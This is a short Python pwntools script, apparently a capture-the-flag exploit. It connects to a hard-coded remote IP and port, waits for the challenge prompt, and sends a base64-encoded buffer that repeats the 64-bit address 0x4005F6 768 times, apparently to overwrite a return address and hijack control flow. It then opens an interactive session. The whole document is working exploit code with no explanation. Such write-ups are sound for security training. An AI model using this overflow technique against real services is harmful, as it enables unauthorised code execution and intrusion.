from pwn import *
import base64

r = remote("45.32.31.134", 20100)
r.recvuntil("(You have 20 sec to solve)")
r.recvline()
r.recvline()

while True:
	if "#" in r.recv():
		break

payload = p64(0x4005F6)*0x300
payload = base64.b64encode(payload)
print payload
r.sendline(payload)
r.interactive()
